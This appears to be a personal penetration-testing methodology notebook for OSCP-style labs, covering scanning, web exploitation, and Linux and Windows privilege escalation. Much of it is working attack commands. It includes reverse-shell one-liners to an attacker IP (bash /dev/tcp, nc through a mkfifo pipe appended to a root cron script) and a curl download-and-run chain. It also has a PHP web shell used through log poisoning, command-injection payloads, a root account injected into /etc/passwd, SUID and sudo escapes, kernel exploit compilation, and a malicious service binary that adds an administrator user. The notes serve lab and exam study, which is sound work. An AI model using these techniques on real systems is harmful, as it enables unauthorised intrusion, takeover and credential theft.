## Scanning

```
# TCP

# Initial Scan
sudo nmap <ip> -sV -sC -sT -p- -oN ~/proving_grounds/<standalone>_TCP

# Deep Scan
sudo nmap <ip> -A -p<ports> -oN ~/proving_grounds/<standalone>_TCP_ALL
```

```
# UDP

# Initial Scan
sudo nmap <ip> -sU --top-ports=100 -oN ~/proving_grounds/<standalone>_UDP


# Deep Scan
sudo nmap <ip> -sU -A -p<ports> -oN ~/proving_grounds/<standalone>_UDP_ALL
```

```
# Autorecon

sudo env "PATH=$PATH" autorecon <ip_address>
```

```
# Nikto
nikto -host <ip_address>
```


## Footprinting

Go through each port
	make note of versions and any extra information it gives you

Enumerate ports
	use [cheatsheet](https://s4thv1k.com/posts/oscp-cheatsheet/)
	use Hacktricks
	reference notes on ports I have made
	Manually enumerate AND Auto-enumerate

HackTricks
	Check on website DIRECTLY for unknown ports

Look for any cleartext usernames/passwords in the nmap scans
	If you do find usernames, attempt to authenticate to services/ports
	password reuse is common!!! Usernames might also be passwords

Authentication      `# DO FOR ALL PORTS YOU CAN`
	anonymous auth
	`<user>:<user>` cred combos
	default creds (based on documentation you find)
	automated tools
	Credential REUSE
		SSH KEYS, user passwords (both local and domain), hashes, etc (do this on EVERY service)

HTTP ports note
	after adding anything to /etc/hosts file, recheck ALL http ports you have
	ie: 8000, 14080, 12080, etc...
	you might get more access to things

Unknown Port/Service?
Always check on Hacktricks DIRECTLY first

Google search "Hacktricks <port_number>
	EXTREMELY useful if port is not showing anything at all, or an uncommon port
	exploitdb results for random exploits associated for that port may show up

Google Search "`<service/port> exploit"
	searchsploit is not always sufficient

Google Search "`<service> RCE`"

If nothing else, brute force w/ nxc and rockyou and any user creds you have found and/or passwords OR SSH keys

Can we bind to any ports directly via `nc <ip> <port>`?
	some exploits will open a port which we can bind to

SMB Open?
	Automated enum:
		`enum4linux
		`nbtscan -r <ip>
		`nmap -script=smb-vuln\* -p445 <ip>
	Manual Enum
		smbclient
	Can we PUT files?
		yes? see [[445 SMB|445 SMB]]
		

MySQL
	enumerate
	also consider modifying entries (if possible)

AD?
	See AD Section

BruteForcing
	Consider date the box came out
	`<Season><Year>`
	`nxc smb` is golden

Weird files? able to transfer back (FTP,SMB,etc...)?
	.exe files?
		consider `strings`
		`strings -e l <exe_file>
## Web Apps
```
Consider some web apps are static vs dynamic:
	dynamic apps = easier rev shells
	static pages may not allow for rev shells
```

if you find a domain name, add to /etc/hosts

Wappalyzer
	get versions
	search for exploits of versions
		searchsploit AND google
	Search website TITLE as well, sometimes there are vulns for this as well.
	google `"<software> rce"` as well for ideas

Enumerate webpages
	Feroxbuster
		`feroxbuster --url <ip_address> --wordlist=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt`
			not getting many hits?
			try for extensions as well
		`feroxbuster --url <ip_address> --wordlist=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt +x php,txt,bak,html,zip
		also
		scan any manually identified directories not picked up by previous scans
	Github documentation
		/admin `#PAY ATTENTION TO ANY DIRECTORIES LIKE THIS`
			if no access to /admin, attempt files within ANYWAY
			came with /config, etc...
	Subdomain Fuzzing
		worth a shot 
		use ffuf to fuzz for subdomains
			not usually necessary, probable out-of-scope for oscp
	Check for multiple webservers on same port
		/etc/apache2/sites-enabled
		my be localhost only
			ie: port forward required
	Guess directories (last resort)
		Using names we have uncovered, you can try `/<name>`
		this is if ferox and fuzzing both fail


Nikto `# DONT SKIP`
	can tell us about the site requests we can make
	vuln scan too
		nikto -h <ip_address>

Duplicate web pages
	if a website has a backup (ie: /old) and it appears to be the same as the current one, compare the page source of both the duplicate and current web page
		there may be clues
		look for subdomains, weird strings, etc...

Manual Enum 
	explore website, look around
	make note of users (even it not 100% sure), comments, links to other sites, etc
		add users to users file (AND default users like 'admin')
		add passwords to pass files
		etc
	search for search points to attempt SQLi

View Page source
	on every page...
	might have valuable information
	also consider html2markdown
		 `curl -s http://<ip>:<port>/ | html2markdown`
		useful for finding exposed creds

Login Portal
	look up default creds
		CASE MATTERS
		Admin:Admin might not work but admin:admin might...
	Look up website documentation
		github is often available
		might find creds in source files
	SQLi
	Forgot Password button?
		some sites may be insurecure and allow you to reset other user's passwords
	Check Kali password repo locally
		`cd /usr/share/wordlists/seclists
		`grep -r '<name_of_web_app'`
		this may contain default credentials
		example: [[Billyboss]]
	final resort
		hydra [[Web App Bruteforcing]]
		ideally we already have a user or a pass and just need the other
			run this in background while enumerating other things

Config files exposed?
	phpinfo.php, .ini, etc...
	look for users, sensitive information, strings, paths, etc
	wget for easier parsing

Is it a webapp, PHP and windows?
	likely part of XAMPP
	/htdocs is often root of these pages
	if we have upload capabilities, uploading here may be a possibility

HackTricks
	Check if the type of site is listed in hacktricks
		may show common attack vectors, etc

Visit /api AND /api/
	if present, fuzz it for additional subdirectories...
	visit `/<subdirectory>` AND `/<subdirectory>/`

Visit /.git
	gitdumper

Visit /.env
	

More automated tooling
	depends on site 
	wordpress for instance
		`wpscan --url "target" --enumerate vp,u,vt,tt
		and
		`wpscan --url "target" --enumerate p
	git-dumper
	etc
	will add more

APIs
	see [[Abusing APIs and Web Requests]] note page


```
# COOKIES MATTER

If an exploit fails/you get a forbidden and it requires a PHPSESSIONID, try intercepting a request via burp to get your OWN and retry
```

SQLi
	Payload all the things
		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
	check in EVERY input form
		newsletters
		signups
		etc
	error based first
		if nothing, check via time based sqli just to be sure
	if sqli probing gives and ERROR, then you perform a command but get invalid creds or no return, that does NOT mean SQLi is necessarily failing.
		see SQLi methodology notes for details

File Upload Vulns
	Restricted?
		Try and mask the extension and name
		Find where the file is stored
		Aim to get a web shell or rev shell
		Is it checking for Magic Numbers?
			check our [[Magic Numbers Cheatsheet]]
			include ASCII in data field (in burp request)
	Unrestricted?
		you can pass things in the file names too
		ie
		path traversal in the file name
			../../../../../../../../etc/passwd
			also
			ssh-keygen
				see [[4 File Upload Vulnerabilites]]

Path Traversal
	Try both in browser AND burp
	any pages that are like ?view=<file_name>
	try and swap out the file name to ../../../../../../etc/passwd or something
	Successful Directory Traversal?
		Enumerate!
			dont forget `wget` for easier parsing of info...
			[Windows](https://s4thv1k.com/posts/oscp-cheatsheet/#windows)
			[Linux](https://s4thv1k.com/posts/oscp-cheatsheet/#linux)
			SSH Keys [[Methodology/Web App/File Inclusion/Local File Inclusion (LFI)]]
				Windows: `/Users/<user>/.ssh/<keys>`
				Linux: `/home/<user>/.ssh/<keys>`
				replace `<keys>` with id_rsa, id_dsa, etc... 
			or
			read a rev-shell file you already uploaded via file upload
				try /tmp
				AND
				/dev/shm
			remember this can be used later to read php files from writable directories too...
	Success but enumerating not helpful?
		Try [[3 Remote File Inclusion (RFI)]]
			host rev shell on http server for example and access via RFI
	Fail?
		Try [[1 File Inclusion Vulnerabilities]]
			user agent poisoning: 
			user agent > `<?php echo system($_GET['cmd']); ?>`
			then `../../../../../../path_to_log_file/file.log&cmd=whoami`
				/var/log/apache2/access.log is common
		Fail?
		Enumerate:
	Looking for creds?
		Try looking through webapp documentation. It might point you to the file path you need to look at
			look for github pages of the product
			look for DUPLICATE conf files (might be more than 1)
		Sai's OSCP cheatsheet shows common file locations to check
	Need to READ a .php file?
		accessing it will run it
		instead, [[PHP Wrappers]] can be used to read their contents (DO BOTH -- encoding may be required)
			`#remove .php from <file> at end of filter`
			1. `index.php?page=php://filter/resource=<file>` 
			2. `index.php=file=php://filter/convert.base64-encode/resource=<file>
	Wrapper to embed data elements
		see [[PHP Wrappers]]
		`index.php?page=data://text/plain,<?php%20echo%20system('<cmd>');?>`
	Zip and RAR filters see [[PHP Wrappers]] as well
	Look through user directories in `/home/<user>` (LINUX)
		Are you able to list directory contents?
			yes?
				great!
			no?
				`/home/<user>/.bash_history
				`/home/<user>/.bashrc
				`/home/<user>/.bash_logout
				`/home/<user>/.profile
				`/home/<user>/.ssh/id_<key_algo_type>` (try multiple like rsa, ecdsa, etc)
```
# Found SSH keys?
try on multiple users! not just the user you found it in. Treat it like you would password reuse
```

```
# why both /tmp and /dev/shm?

For system services systemd provides the `PrivateTmp=` boolean setting. If turned on for a service (👍 which is highly recommended), `/tmp`/ and `/var/tmp`/ are replaced by private sub-directories, implemented through Linux file system namespacing and bind mounts.

/dev/shm is a shared temp storage loaded in RAM
```

```
Some files we will not be able to read with path traversal alone, loike .php, .py, etc and will need another method to read their contents
```

LFI cont.
	File of LFI payloads to use, combine LFI attack with FUZZING (ffuf)
	https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt

Reverse shells
	If rev shells arent working, consider commands which download files from a http server that contain the rev shell, then execute that way
	consider uploading to /tmp or /dev/shm
	consider using bash instead of /bin/bash, or sh, etc...
	consider port usage (443, 80 are more likely to work that 4444)
	Consider transferring, chmod +x, then running
		example
		`curl 192.168.45.183/revshell -o /tmp/revshell && chmod +x /tmp/revshell && ./revshell`
		this usually will work
	Consider transferring over `bash` or `sh` as well as the shell
	Brute force rev shells
		just go through this list until something works!!!
		ALL OF THEM
			especially busybox...
	[[msfvenom]] to create rev shell executables
		windows -- exe
		linux -- elf

Command Injection
	If we can successfully POST, we can potentially inject additional commands in the data fields ie revshells.
```
# example of command injection 

insert after a data field

add ; AFTER as well AND # to comment out rest of line
----------------------------------------------

POST / HTTP/1.1
...snip...

data_field=/some/data/here;sleep+4;#

----------------------------------------------
the example above will cause the Response to PEND for 4 seconds. if it pends, we have command injection and can replace it with a rev shell

______________________________________________

POST / HTTP/1.1
...snip...

data_field=/some/data/here;bash+-c+'/bin/bash+-i+>%26+/dev/tcp/<KALI_ip_address>/<listen_port>+0>%261;#
```
NOTE: The rev shell is an example and you may need to try different ones, like busybox nc
	not working? consider [[SSH Keygen]]
;# after command injection is important, DO NOT IGNORE
	See [[5 OS Command Injection]]


Found a public exploit?
	Try it
	Doesnt work?
		Verify everything was typed correctly FIRST
		read code and see if it can be attempted manually via burp, curl, browser etc...
			ie:
			path traversal
	Still not working?
		Search for other exploits
		google `"<CVE> exploit github"` and similar
			if no CVE id, the name of the exploit works too
			look through MULTIPLE variants

Find any creds combinations
	Password reuse
	Attempt against all ports available!

Users (not usernames)
	consider username-anarchy to get a userlist (see [[Cracking]])
	consider cewl

.htaccess
	we can sometimes upload this to allow for more extensions to be allowed
		see [[Access]] Box

Sensitive files
	.php or somilar code files, if we try and read it may not dispaly the code because it is running the file
	place in parking lot
	get creative to read these
		php wappers for instance
		path traversal exploits
		if we have access to smb we can pull these files possible and read locally
	phpinfo.php
		look for web root, versions of software (potential exploits), cool file paths, etc...

Weird/out of place pictures?
	See [[Steganography and Metadata]]
	steghide
	exiftool
## Linux

#### Situational Awareness

Restricted Environment?
	https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
	look for what binaries are accessible to you
	consult GTFObins for easy breakouts
Post-Breakout
	Modify our PATH so we can use all the commands
	`export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin`


```
Consider running throgh Manual enumeration (At least situational awareness) prior to automated tools so you do not rabbit hole...
```

Automated Enumeration:
Transfer over linpeas.sh and /usr/bin/unix-privesc-check
```
# Automated tools

./linpeas.sh
	yellow-red findings
	users
	root files we can edit
	etc...

./pspy64 (give a few minutes)
	automated process snooping
	run in the background as you look for other things
	examples:
		pivot to other user (cleartext creds)
		root cronjobs (UID=0)

./unix-privesc-check <mode> > output.txt
	standard mode
	detailed mode
```


Manual Enumeration:
`id`

`sudo -V
	DO NOT IGNORE -- sudo 1.8.0 to 1.9.12p1 vulnerable
	See sudo privesc
	https://www.exploit-db.com/exploits/51217
		requires user pass to exploit
	https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit 
		sudo version 1.8.31, tested on ubuntu 20.04
		need to COMPILE on victim box -- (gcc present?)
			transfer over the files
			`make`
			`./exploit   # you are now root`

`sudo -l`
	check binaries for GTFO bins
		might be an easy win
	if not in GTFObins, review source code of the bin
		It may import a package that is vulnerable

`env`
	check for plaintext strings
	add to passwords, try password reuse for other services, etc

`cat /etc/passwd`
	add users to user file
```
# ALWAYS try to switch user (su) as <user>:<user> as the creds!
## OffSec seems to love this attack vector...
```

`cat /etc/shadow

`ls -la /etc/passwd`
	check if modifiable
	check if /etc/sudoers is modifiable as well

Manually enumerate the following
	`/directory/we/spawn/in`
		and check the adjacent directories
		might find interesting files
	`/home/<user>/<all_files>`
	`/home/<users>
	`/
		make sure to look at permissions of ALL files/directories
		/root might have read rights...
	`/var
	`/opt`  OFFSEC LOVES THIS ONE

`hostname`

OS version and architecture
	Version
		`cat /etc/issue`
		`cat /etc/os-release
	Architecture
		`uname -a`
	Once you have these, cross-reference with linpeas output for potential kernel exploits worth trying

System Processes
	including those run by privileged users
	`ps aux`
		-ax list all processes without a tty
		-u user readable format
	linpeas also reveals this
	if odd ports are open AND root processes, should trigger siren bells

Random exposed creds
	`cat <path>/* | grep password

Full TCP/IP configuration
	`ip a
		make note of interfaces
Routes
	`routel`

All active network connections
	`ss -anp`
	`ss -ntlpu`
	check for anything running that nmap did NOT reveal
		if it exists > chisel
	
Inspecting custom ip tables
	`cat /etc/iptables/rules.v4`

Scheduled Tasks
	`ls -lah /etc/cron*`
	Sysadmins often add own scheduled tasks in /etc/crontab
		`crontab -l`
			current user cron tasks
		`sudo crontab -l`
			root cron tasks
			no access?
				run `./pspy64` , look at UID=0
	linpeas
		make note of the PATHS that cron looks through(at bottom of cron section in linpeas)
			if there is a root cron job that is run (use pspy64 to find these) AND a path exists that we can modify, we can create a malicious executable named the same as the cron job in this path that will execute (eventually)
			it will likely be yellow-red
				see [[Roquefort]] as an example

List installed packages
	`dpkg -l`

List all world writable directories
	`find / -writable -type d 2>/dev/null`

List /etc/fstab and all mounted drives
	`cat /etc/fstab
	`cat /dev/sda1`

List all available drives using lsblk
	`lsblk`
	we might be able to mount different partitions of drives and look for documents

Listing loaded drivers
	`lsmod`
	Display additional info about a module
		`/sbin/modinfo libata

Searching for SUID files
	`find / -perm -u=s -type f 2>/dev/null
	special rights can pertain to executable files
	LOOK CAREFULLY IDIOT. EVERY TIME!!!!!!
		setuid
		setgid
		allow user to execute file with the rights of the owner (setuid) or the owner's group (setgid)
	GTFObins for quick wins
		use absolute paths to save yourself headaches
	also
	GOOGLE any abnormal binaries
	Polkit there? try exploit 50689

Mail files
	if SMTP is up, check these directories
	/var/mail
	/var/spool/mail
	/var/www/mail
	might find creds
		`cat <path>/* | grep password` 
			`# Password might not work and you have to probe manually`

Config files
	Be sure to look at config files for databases, web servers, etc that you have already been exposed to...
		ie: website that you were unsuccessful to login to, perhaps you now have the credentials...

Always keep previous exploits in back of your mind
	example: LFI and need to pivot to a user that is in control of the webserver, you can place a php revshell somewhere, even if you do not have perms over web root dir...

#### Exposed Confidential Information

User history files
	often hold clear-text user activity

dotfiles
	user specific config files in user home directory
	.bashrc as an example

Sometimes creds are stored inside env variables

Inspecting Environment Variables
	`env`
	example: we find cred "lab"

Inspecting .bashrc
	`cat .bashrc
	any passwords, we could try and `su root`

Inspecting .profile
	`cat .profile`

Instead of aiming directly for root account, we could try gaining access to other users we discover
	Generate wordlist for brute force attack
		`crunch 6 6 -t Lab%%% > wordlist`
		makes list of passwords Lab000, Lab001, ...
	Brute force with hydra
		`hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V`

sudo -l
	Use to see what commands we can run
	`sudo -i`
		if we are a privileged user, we can use this to elevate to root

Loose SSH kety
	If found, save key and use
		both for current user and ALL other discovered users
	Check Authorized Keys file to verify scripts arent in the way

Harvesting Active Processes for Creds
	`watch -n 1 "ps -aux | grep pass"

Using tcpdump to Perform Password Sniffing
	`sudo tcpdump -i lo -A | grep "pass"

Config files
	Be sure to look at config files for databases, web servers, etc that you have already been exposed to...
		ie: website that you were unsuccessful to login to, perhaps you now have the password of the user...
#### Insecure File Permissions

###### Abusing Cron Jobs
Inspect cron log file
	`grep "CRON" /var/log/syslog
	look for scripts that execute as root

Showing content and permissions of an example script
	`cat /home/joe/.scripts/user_backups.sh`
	`ls -lah /home/joe/.scripts/user_backups.sh`
	checking if regular users can write to it
		If others has W priv, we can modify it

Inserting a reverse shell one-liner
	`cd .scripts`
	`echo >> user_backups.sh`
	`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <our_ip> 1234 >/tmp/f" >> user_backups.sh`
	cat to verify

Start listener and and wait for cron job to execute
	`nc -lvnp 1234`

Also check [[Cronjobs]]

###### Abusing Password Auth
Unless AD of LDAP is used, Linux passwords are generally stored in /etc/shadow
	not readable by normal users
	For backwards compatibility, if a hash is located in /etc/passwd, it is considered valid

Assume /etc/passwd does not have correct permissions set
	we can edit /etc/passwd to modify the root password and escalate our privleges

Demonstration
	Generate MD5 hash
		`openssl passwd w00t`
			Fdzt.eqJQ4s0g `#NOTE: Older linux systems, openssl may default to DES`
	Modify /etc/passwd
		`echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd`
	Switch user
		`su root2`
	Verify
		`id`


#### Insecure System Components

###### Abusing Setuid Binaries and Capabilities

When not properly secured, setuid binaries can lead to attacks that elevate privileges 

When a user or a system-automated script launches a process, it inherits the UID/GID of its initiating script: this is known as the real UID/GID.
	as an example
	`passwd` is used to change a user's password
	but this requires modifying /etc/shadow
	`ps u -C passwd`
		we see this command is run as root as this is needed to modify /etc/shadow
		take note of PID = 1932

Inspecting passwd's process credentials
```
joe@debian-privesc:~$ grep Uid /proc/1932/status
Uid:	1000	0	0	0
```
	UID = 1000 (user)
	but the next 3 0s indicate ROOT

To explain, the passwd binary has a special flag names Set-User-ID (SUID)
```
joe@debian-privesc:~$ ls -asl /usr/bin/passwd
64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
```
look
	instead of RWX, it is RWS
	can be configured with `chmod u+s <filename>`


Using this technique results in a legitimate and constrained privilege escalation and because of this (as we'll learn shortly), the SUID binary must be bug-free to avoid any misuse of the application.


Demonstration
	Go through Manual or Automated enumeration techniques
	Discover `find` is misconfigured and has SUID flag set
	Abuse this
		`find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
		this opens a bash shell as ROOT

___
Linux capabilities

Another set of features subject to priv esc techniques

These are extra attributes that can be applied to processes, binaries, and services to assign specific privilegs normally reserved for admin ops life traffic capturing or adding kernel modules

Manually enumerating Capabilities
	`/usr/sbin/getcap -r / 2>/dev/null
	look for any that have setuid capabilities enabled

_GTFOBins_[3](https://portal.offsec.com/courses/pen-200-44065/learning/linux-privilege-escalation-45403/insecure-system-components-45457/abusing-setuid-binaries-and-capabilities-45411#fn-local_id_902-3)
	Use to exploit misconfiguration
	This site provides an organized list of UNIX binaries and how they can be misused to elevate our privileges

Demonstration
	Enumerate capabilities
		`/usr/sbin/getcap -r / 2>/dev/null`
		we see perl has setuid configured
	Search GTFOBins
		search for perl
		found a command
	Run exploit
		`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
	gain root shell


###### Abuse Sudo

Check version
	`sudo -V`

Inspect current user's sudo permissions
	`sudo -l`

Look through what binaries we are allowed to run via sudo
	sometimes we have easy ones
	sometimes not
	Look through GTFObins[3](https://portal.offsec.com/courses/pen-200-44065/learning/linux-privilege-escalation-45403/insecure-system-components-45457/abusing-sudo-45412#fn-local_id_928-3)

Use GTFObins[3](https://portal.offsec.com/courses/pen-200-44065/learning/linux-privilege-escalation-45403/insecure-system-components-45457/abusing-sudo-45412#fn-local_id_928-3) to look up possible attack paths for binaries

Example
	`sudo -l
```
User joe may run the following commands on debian-privesc:
    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```
ok
	crontab -l
		does not let us edit crontabs
	tcpdump
		we found something on GTFOBins
```
joe@debian-privesc:~$ COMMAND='id'
joe@debian-privesc:~$ TF=$(mktemp)
joe@debian-privesc:~$ echo "$COMMAND" > $TF
joe@debian-privesc:~$ chmod +x $TF
joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
[sudo] password for joe:
dropped privs to root
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...
compress_savefile: execlp(/tmp/tmp.c5hrJ5UrsF, /dev/null) failed: Permission denied
```
Permission denied
	Inspect syslog for why
```
joe@debian-privesc:~$ cat /var/log/syslog | grep tcpdump
...
Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
```
AppArmor blocked us
	App Armor provides mandatory access control (MAC)
	Apt-get?
		GTFOBin
			we see a payload
		`sudo apt-get changelog apt
		`!/bin/sh
		Success!




if we need to modify a python script, when inputting a rev shell, only input from 'import' onwards, do not include the python3 preface


Example 2: Make

if you have sudo over a command that does `make install`, check where this is working
	if you have a Makefile and privs over it, you can modify the SHELL key to a rev shell (within a file)
		`vim revshell` in /tmp/
		`SHELL = /bin/bash /tmp/revshell`
		then use the sudo command you habe to execute the Makefile
###### Exploiting Kernel Vulnerabilities

```
Pwnkit (exploit-db 50689) showing on linpeas? try this--
	github.com/joeammond/CVE-2021-4034
	CVE might not always be visible!!!
```

Success may depend on both Kernel and OS flavor

Target system
	`cat /etc/issue`
Kernel and Architecture
	`uname -r`
	`arch`

Demonstration
	`cat /etc/issue`
		Ubuntu 16.04.4 LTS \n \l
	`uname -r`
		4.4.0-116-generic
	`arch`
		x86_64
	Searchsploit
		`searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
		filtering clutter 
		found one
```
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                             | linux/local/45010.c
```
ok
	Read instructions
		`cp /usr/share/exploitdb/exploits/linux/local/45010.c .`
		`head 45010.c -n 20`
		We see this:
			`gcc cve-2017-16995.c -o cve-2017-16995
			so we just need to compile
	Rename exploit
		`mv 45010.c cve-2017-16995.c
	Transfer 
		`scp cve-2017-16995.c joe@192.168.123.216:`
	Compile on target machine
		`gcc cve-2017-16995.c -o cve-2017-16995`
	Inspect
		`file cve-2017-16995`
	Execute
		`./cve-2017-16995`
	Verify
		`id`


## Windows

```
Consider running throgh Manual enumeration (At least situational awareness) prior to automated tools so you do not rabbit hole...
```

Fire off tools
```
.\winPEASany.exe
	possilbly winPEAS.ps1
	

.\LaZagne.exe all

.\jaws-enum.ps1

Import-Module .\PowerUp.ps1
	Invoke-AllChecks
	Get-ModifiableServiceFile
	Get-UnquotedService

.\nc.exe
	if we need a better shell


windows_exploit_suggester # Use on OLDER systems
	python3 -m pip install xlrd
	python2.7 windows-exploit-suggester.py --update
	python2.7 windows-exploit-suggester.py --database <database> --systeminfo <sysinfo> 	

wesng #	Use on NEWER systems (POST-2017)
	.\wes.py --update
	.\wes.py <systeminfo_file>


# AD only

sharphound
```
Note:
	If not immediately obvious the solution, proceed down manual enumeration
Winpeas notes:
	make sure to check [[AlwaysInstallElevated]]


#### Situational Awareness

`whoami

`whoami /priv`

`whoami /groups

`hostname

`set`
	look for odd strings

`net user`
	`net user <user>`
	`net user /domain
	or
	`Get-LocalUser
	Are there other users on the box? (aside from Administrator)
	Consider you may need to pivot to other users
		consider webshells, runas, etc

Existing Groups
	net group
	`net localgroup`
	or
	PS `Get-LocalGroup`

Enumerate users of groups
	`net localgroup <group>`
	or
	PS `Get-LocalGroupMember <group>`

OS, version, and architecture
	`systeminfo`
		x64 (64 bit) vs x86 (32 bit)
		OS name
		OS version
		System type:
	permissioned denied?
		\output.txt
			usually contains system info

Network Information
	`ipconfig /all`
		view all network interfaces
		DNS Servers
		Gateway
		Subnet mask
		etc
	`route print`
		get the routing table
	`netstat -ano`
		list all active network connections
			:80 open?
			consider chisel or curling

Installed applications
	32 bit apps
		`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
	64 bit apps
		`Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
	Enumerate Downloads folder of user as well
	Any out of the ordinary software? Research and see if there is additional info you can query.
		for instance, Putty you can query the registry for sessions which may contain creds:
			`reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
	Display all properties
		remove `| select displayname`
	can look for public exploits 
	password managers we could try and find master pass

Running applications
	PS `Get-Process`

Search for programs in user directory that you authenticate into
	may have to give them different prompts to see what they can do
	might have admin privs
	Consider reverse shell if evil-winrm gives issues with executing binaries

Manually Enumerate Directories
```
dir /a (reveal hidden files)
dir /q (show owner)
```
-
	`\directory\we\spawn\in`
		and check the adjacent directories
		might find interesting files
	`\Users\<user>\AppData\stuff
		look for executables we have full write access over
			Appdata\Local...
	`\Users\<user>\<all_files>
		look for anything interesting, scripts, etc
		see what happens if you run them
	`\Users\<users>
		make note of users, see if you can explore any of them
	`\
		make note of any out of the ordinary directories
		look for odd scripts 
		look for strings
		etc

Searching for files
Search for specific file
	`dir /a /s *<file>
	or
	`Get-ChildItem -Path C:\ -Filter <file> -Recurse -ErrorAction SilentlyContinue -Force 
```
# Search for password manager databases on C:\ Drive
Get-ChildItem -Path C:\ -Include *.kdbx,*.db,*.sql -File -Recurse -ErrorAction SilentlyContinue


# Search for sensitive info, text files and password manager databases in home directory of dave
Get-ChildItem -Path C:\Users\r.andrews -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*ini -File -Recurse -ErrorAction SilentlyContinue


# Look for zip files (may be backups)
Get-ChildItem -Path C:\ -Include *.zip -File -Recurse -ErrorAction SilentlyContinue


# Search for SAM/SYSTEM/SECURITY accessible by current user
Get-ChildItem C:\ -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '^(SAM|SYSTEM|SECURITY)$' -and -not $_.PSIsContainer } | Format-List FullName,Length
```

Local groups user steve is a member of
	`net user steve
	rdp as steve

Retry my.ini file
	found pass wor another user backupadmin
	`net user backupadmin
		Administrator group
		but not Remote Desktop User

`Runas`
	allows us to run a program as a different user
	`runas /user:backupadmin cmd
		opens cmd prompt

User History
	`Get-History`
		obtain list of commands executed in the past
	Retrieve history from PSReadline
		`(Get-PSReadlineOption).HistorySavePath`
			make sure to cd to the path identified, you may see additional files

Config files
	Be sure to look at config files for databases, web servers, etc that you have already been exposed to...
		ie: website that you were unsuccessful to login to, perhaps you now have the password of the user...


```
If there are other users, have you considered ways to become that user? apache, nginx etc... if we are able to get web shells/rev shells, we can become these users
	we may need to find web root directory
	Get-Childitem can be used for this
```

#### Leveraging Windows Services

##### Service Binary Hijacking

Each windows service has an associated binary file

Assume a scenario where a dev creates a program, installs it as a service, but does not secure permissions, allowing RX access for all members of Users group

List of Services with a binary path
	`Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
	2 services running in \xampp directory instead of \windows\system32

Enumerate permissions on service binaries
	`icacls`
	or
	PS `Get-ACL`
	Example
		`icacls "C:\xampp\apache\bin\httpd.exe"
			we see BUILTIN\Users: (RX)
			can read and execute
			cannot replace with malicious binary
		`icacls "C:\xampp\mysql\bin\mysqld.exe"
			we see BUILTIN\Users: (F)
			full rights
		can run on multiple files
			`icacls /?` to see examples

Enumerate Services
	PS `Get-Service -name "<service>`
		enumerates state of service
	PS `Start-Service <service>
		starts service
	PS `Stop-Service <service>`
		stops service


```
#NOTE: Exploit v2 is much faster usually
```

###### Exploit v1 (Adding a user admin & enable RDP)
See [[Enable RDP]] for more in depth code
Create a malicious binary to replace mysqld.exe
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user hackerman password123! /add");
  i = system ("net localgroup administrators hackerman /add");
  i = system ("net localgroup \"Remote Desktop Users\" hackerman /add");
  
  return 0;
}
```
adduser.c code
	explanation
	this adds a user dave2 and adds him the the administrators group

Compile
	`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
		cross-compile to a 64 bit application

Transfer and replace binary
```
PS C:\Users\dave> iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe  

PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

Stop service
	We need to restart the service before executing our malicious binary
	`net stop mysql`
		insuficient permissions
	If startup type is "Automatic" we can restart the machine to reboot it
	Enumerating Startup Type
		`Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<service_name>'}
		Auto
		perfect
	We need SeShutdownPrivilege to reboot
		`whoami /priv`
		we have it
		Disabled just means if the privilege is currently enabled for the running process

Reboot
	`shutdown /r /t 0`
		`/r    #reboot instead of shutdown
		`/t 0   #(0 seconds)

Verify if malicious binary ran
	upon reboot, check users
	`Get-LocalGroupMember administrators`
		success
		`User        CLIENTWK220\dave2         Local

`runas`
	`runas /user:domain\user ".\shell.exe"`
	obtain interactive shell as dave2
	use msfvenom to create a exe reverse shell
	Use RunAsUser.exe if you do not have an interactive shell (see methodology notes)

to restore original state of device, first delete our binary restore the original, and restart the system

###### Exploit v2 (Rev shell as nt authority\system)

Instead of doing v1, just swap out the service with a rev-shell generated by msfvenom (or whatever your prefer)

```
#Generate revshell with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=<port> -f exe -o shell.exe

#Transfer over file
iwr -uri http://192.168.48.3/shell.exe -Outfile shell.exe

#Replace binary
